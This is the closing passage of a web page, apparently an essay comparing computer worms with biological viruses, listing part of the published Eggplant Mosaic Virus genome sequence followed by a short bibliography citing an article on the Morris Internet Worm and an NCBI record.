<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>     3661 agccgcactg gcgtctactt cgtcggcaat
ctgcacctgg catcaaacag ctttggcaca</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>     3721 aactacatgt tctctcaagc tctctgccaa
ggcacaatcg acctaaacaa cgtgttcccc</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>     3781 cacatcatgc ctcacctccc gaaaatgtat
gaacccatcc gctcccggtc caaccgtttt</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>     3841 gtgtctgggt ccctcaattt tcgaccaacc
accaattccc gcctcctttc cagtctcact</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>     3901 aagccaaccc acctcccccc tcacatccct
accaaccact ccctggatgt cctagtttcc</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>     3961 aaccctgtgc tccttggtga gaccctcgac
cctcgattgg aggtcctcca cctcccccca</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>     4021 actcgcctcc cattgcatct ggacctcctg
cccacagtac cttcctcttc cagcttctcc</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>     4081 tcagtcgacc atcttttccc aacccccatc
tcccccgcta tctgcggcta caccttcgaa</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>     4141 aatttggccg cattcttcct cccagctcat
gacccggacc taaaggaggt gctcatcaat</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>     4201 gaccaaaaga gcaaccagtt cccatacttg
gacgcccctt ttgagctttc gtgccaaccc</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>     4261 tcctcactgt tggcaccaat tcacaagccg
gcctcggatc caacccttct ccctggctcc</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>     4321 atcaagaaac gcctcagatt ccgcgcttct
tcctccccat attccatcac tccatctgat</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>     4381 caacttcttg gtcaacacct cttctcttct
ttgtgcctgg cttatgggcg caaccccaat</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>     4441 tctgtcctcc ccttccaacc tgagctcttc
agtgagtgca tatgcattaa tgattacgct</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>     4501 caactctcct ccaagactca agccaccatc
gtggccaatc atcaaaggtc tgatcctgac</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>     4561 tggcgcctaa ctgctgtccg catctttgcc
aaggctcaac acaaagtaaa cgacgcttcc</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>     4621 atcttttccg ggtggaaggc ttgccaaact
ctagccctga tgcacggtta catcattctc</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>     4681 gtactcggcc cagtcaagaa ataccaacgc
atttttgatt ccaaggacag acctccccac</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>     4741 atctactacc actgcggtaa aactccctcc
cagctctccc aatggtgcca aactcacctt</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>     4801 tctggctctt cctacatcgc caacgactac
actgcctttg atcagtccca acacggcgag</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>     4861 gctgtggtcc tggaatgttt gaagatgcgc
cgcctctcca tcccggactc tctcattcag</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>     4921 ctccactccc acctcaagtg ttccgtcgac
acccagttcg gccccctcac ctgcatgcgc</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>     4981 ctcactggcg agccgggcac ttatgatgac
aactctgact acaacctagc tgtcatctac</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>     5041 tcccaatact ccctcaatgg ccaccccatt ctgatctcag
gcgatgactc cgtcctttgc</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>     5101 ggcacaccgc ccccttctcc actttggccc
actctcaaga aaatgcttca tctccgtttc</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>     5161 aagatcgaac ggacctccca ccccctcttc
tgcgggtatt acgtctcccc tcatggcgct</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>     5221 gcccgcaacc cgtatgctct cttcgccaag
ctcatgatct gcgttgatga caagagcctc</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>     5281 catgacaaga agttgtccta tctctctgaa
ttctccactg gccatctggc tggcgacctg</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>     5341 gtcacctcca ttctcccttc ccacctactt
ccctatcagt ccgccgtgca cgacttcttc</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>     5401 tgccggaatt gcacgcccgc ggaaaaaatt
ctcctgtctc tggacccaat ccctgagtcc</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>     5461 aaaatcctcc agctcattct caaagttcgc
tgggcttctc aagctttctt ttcctacctg</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>     5521 cctcaaaaag ctcgcgaact ccttgtggca
cgctcttctc tcccgtccct ctattccaat</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>     5581 cccaaagtct ctcaactgga gtctgaattg
cttcccttct ctcaatagat caatggaaga</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>     5641 cacagcaatc atcagaagcc ctcagccctc
cataaacgca ccaggcttcc atctgccacc</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>     5701 caccgactca caacaatcct ctgctattga
actccccttc cagtttcagg ccaccacttt</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>     5761 tggcgcgact gaaacagctg ctcaaatcag
tctggcctcc gccaacgcta ttaccaagct</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>     5821 cgcgtctctc taccgccatg tgcggctcac
gcagtgcgct gccaccatca ctccgacagc</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>     5881 ggccgccatt gccaatcctc tcactgtcaa
catcgtctgg gtgtctgaca attccactgc</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>     5941 caagcccacc gagattctca atgtctttgg
tggatcttcc tacacgtttg gcggcgccct</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>     6001 caatgccacc aagcccctta ccatccctct
ccccatgaac tcggtcaact gtatgctcaa</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>     6061 ggactctgtt ctttacacag attgcccaaa
gctcctggcc tactcagctg ctcccagctc</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>     6121 tccctccaaa accccaaccg ccactatcca
aatccatggc aagctccgct tgtcctcccc</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>     6181 cctcctccaa gccaattaac tctctctccc
tcagccacca cctcgctcct cccccatctc</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>     6241 ctatggtaat tgcggacagt tccgctccct
ctagcacaca gaggtccatt tgggtgcgac</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>     6301 tcccccccct cccgtgggtc aacgggaacc a</span></p>

</div>

<p class=MsoNormal>&nbsp;</p>

<h1>Bibliography</h1>

<p class=MsoNormal style='margin-left:.75in;text-indent:-.25in'><span
style='font-family:Symbol'>·<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</span></span>Communications of the ACM. June 1989. Article: Morris and the
Internet Worm</p>

<p class=MsoNormal style='margin-left:.75in;text-indent:-.25in'><span
style='font-family:Symbol'>·<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</span></span>Special thanks to John Antoniw [john.antoniw@bbsrc.ac.uk] for his
explanation of the Eggplant Mosaic Virus.</p>

<p class=MsoNormal>Genetic code of the EMV: <span style='font-size:6.0pt;
font-family:"Courier New"'><a
href="http://www.ncbi.nlm.nih.gov/htbin-post/Entrez/query?uid=323865&amp;form=6&amp;db=n&amp;Dopt=g"><span
style='font-size:12.0pt;font-family:"Times New Roman","serif"'>http://www.ncbi.nlm.nih.gov/htbin-post/Entrez/query?uid=323865&amp;form=6&amp;db=n&amp;Dopt=g</span></a></span></p>

</div>

</body>

</html>
